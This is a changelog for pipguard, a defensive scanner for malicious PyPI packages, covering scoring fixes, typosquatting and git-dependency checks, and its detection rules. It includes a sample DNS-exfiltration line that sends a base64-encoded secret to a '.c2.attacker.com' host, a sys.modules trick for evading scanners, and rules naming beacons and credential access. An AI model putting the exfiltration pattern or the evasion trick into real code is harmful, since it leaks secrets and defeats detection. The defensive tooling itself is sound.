# Changelog

All notable changes to this project will be documented in this file.
Format: [Keep a Changelog](https://keepachangelog.com/en/1.0.0/)

---

## [Unreleased] — post-0.1.0 hardening

### Fixed

**Scoring system overhaul** (`pipguard/models.py`)
- **BUG**: `1×CRITICAL` produced `score=4.0 → LOW_RISK`. Completely wrong — a single
  CRITICAL finding (e.g., phone-home `.pth`) should never be LOW_RISK.
- Fix: severity-floor override rules added on top of numeric threshold:
  - `1×CRITICAL` → verdict floor **HIGH_RISK**
  - `2+ CRITICAL` → verdict floor **MALICIOUS**
  - `3+ HIGH` → verdict floor **HIGH_RISK**
- **BUG**: `20×LOW` accumulated to `6.0 → HIGH_RISK` (noise inflation).
- Fix: LOW findings capped at 8 contributors to score. `20×LOW = 2.4 → LOW_RISK`.

**DNS exfiltration detection** (`pipguard/analyzer/static.py`)
- New rule: `DNS_EXFIL` (HIGH severity)
- Detects `socket.getaddrinfo()` and `socket.gethostbyname()` with dynamic hostnames in `__init__.py`
- DNS exfil encodes stolen secrets (env vars, tokens) as subdomains:
  `socket.getaddrinfo(base64(SECRET_KEY) + ".c2.attacker.com", 80)`
- DNS traffic bypasses most firewalls — this was a real blind spot.
- Non-init files with socket (e.g., `server.py`) are **not** flagged → no false positives.

**`sys.modules` bypass detection** (`pipguard/analyzer/static.py`)
- New rule: `SYS_MODULES_ACCESS` (MEDIUM severity)
- Attackers use `sys.modules['requests'].get(...)` to call network functions
  without triggering `import requests` pattern matching.
- Now detected in `__init__.py`.

**`safe_version` recommendation validation** (`pipguard/engine.py`)
- **BUG**: Previous version was blindly recommended as rollback without scanning it.
  If `1.82.6` was also compromised, we'd recommend a malicious version.
- Fix: `_find_validated_safe_version()` runs a quick static scan on up to 3 candidates
  and only recommends versions that pass as SAFE or LOW_RISK.

**`alias pip` removed from README**
- Using `alias pip="pipguard install"` breaks `-e .`, `-r`, and other pip flags.
- Replaced with a clear recommended workflow section.

**Comparison table accuracy** (`README.md`)
- `Trivy` correctly described as SBOM+CVE scanner (does file-level scanning, not behavioral .pth analysis)
- `pip-audit` correctly described (does CVE + dependency confusion, not behavioral)
- `socket.dev` added to table
- Added clarifying note: use pipguard *alongside* pip-audit/Safety, not instead of

**Workers rate-limit cap** (`pipguard/cli.py`)
- `--workers` capped at 16 internally to avoid PyPI 429 rate-limiting
- Warning printed when user requests more than 16

### Added

**Typosquatting detection** (`pipguard/safety_checks.py` — new module)
- `check_typosquatting()` using Levenshtein edit distance + SequenceMatcher similarity
- Database of 100+ most-downloaded PyPI packages
- Threshold: edit distance ≤ 2 AND similarity ≥ 0.75
- HIGH severity for distance=1 (e.g., `reqeusts`→`requests`)
- MEDIUM severity for distance=2 (e.g., `numpyy`→`numpy`)
- Catches visual substitution attacks: `fIask` (capital I) → `flask`
- Runs as Step 0 in `AnalysisEngine.analyze()` — no download required

**Git dependency flagging** (`pipguard/lockfile.py`)
- `PackageSpec` gains `is_git_dep: bool` and `git_url: Optional[str]`
- `parse_requirements_txt()` now parses `git+https://`, `-e git+`, `git://` lines
- Git dependencies are marked HIGH_RISK in `audit` output:
  they bypass PyPI review, code signing, and reproducible builds

### Tests

- 69 tests total (was 33) — all passing
- `tests/test_review_fixes.py`: 36 new tests covering all above fixes
- Scoring: 12 test cases for all verdict combinations
- DNS exfil: 7 test cases including false-positive checks
- Typosquatting: 9 test cases including visual substitution attacks
- Git deps: 4 test cases
- Regression: 4 tests ensuring prior detections still work

---

## [0.1.0] — 2026-03-25

### 🚀 Initial Release

**The short story:** We built pipguard the day LiteLLM 1.82.7 hit the news.
The attack hid a phone-home beacon inside a `.pth` file — a mechanism that
executes on every Python interpreter startup. pipguard was designed to catch
exactly this.

### Added

**Core detection engine**
- Static analysis of Python wheels (no sandbox, no Docker required)
- `.pth` file semantic classifier — distinguishes EMPTY / PATH_ONLY / SAFE_CODE / DANGEROUS
  - Empty `.pth` (pytest-cov style): silent ✓
  - `setuptools` distutils shim: LOW warning only ✓
  - LiteLLM 1.82.7 attack pattern: CRITICAL → MALICIOUS ✓
- AST deep analysis: exec/eval obfuscation, network calls in install hooks
- Delayed-trigger detection: network calls in `__init__.py` (runs on every import)
- Zip safety: path traversal + zip bomb detection
- Known malicious hash database (SHA256)

**Version diff**
- `pipguard diff <pkg> <v1> <v2>` — shows exactly what changed between versions
- Flags new `.pth` files, new network imports, behavioral changes

**Lockfile audit**
- `pipguard audit requirements.txt` — scans all pinned packages in parallel
- Supports: requirements.txt, pyproject.toml, Pipfile.lock
- `--fail-on MALICIOUS|HIGH_RISK` for CI integration

**GitHub Action**
- Drop-in action: `uses: allenenli/pipguard@v0.1.0`
- Audits your requirements file on every push/PR
- Fails the build if malicious packages detected

**CLI**
- `pipguard check <package> <version>` — single package scan
- `pipguard audit [lockfile]` — batch scan
- `pipguard diff <pkg> <v1> <v2>` — version comparison
- `pipguard install <package>` — safe install wrapper
- JSON output mode (`--json-output`) for pipeline integration

### Detection rules (v0.1.0)

| Rule | Severity | What it catches |
|------|----------|-----------------|
| PTH_FILE_INSTALL | CRITICAL | `.pth` with external data flow |
| PTH_NETWORK_BEACON | CRITICAL | phone-home on every Python startup |
| PTH_SUBPROCESS | CRITICAL | shell command on every Python startup |
| NETWORK_IN_SETUP | HIGH | network call during `pip install` |
| SUBPROCESS_IN_SETUP | HIGH | shell command during `pip install` |
| OBFUSCATED_CODE | HIGH | base64+exec, eval obfuscation |
| SENSITIVE_PATH_WRITE | HIGH | SSH keys, AWS creds access |
| CURL_WGET_IN_SETUP | HIGH | curl/wget during install |
| INIT_NETWORK_CALL | MEDIUM | network call on every import |
| EXEC_IN_SETUP | MEDIUM | exec() in install hooks |
| SITECUSTOMIZE_MODIFY | MEDIUM | system-wide startup hook |
| KNOWN_MALICIOUS_HASH | CRITICAL | SHA256 hash database match |
| WHEEL_PATH_TRAVERSAL | CRITICAL | directory escape in wheel |
| WHEEL_ZIP_BOMB | HIGH | excessive file count |
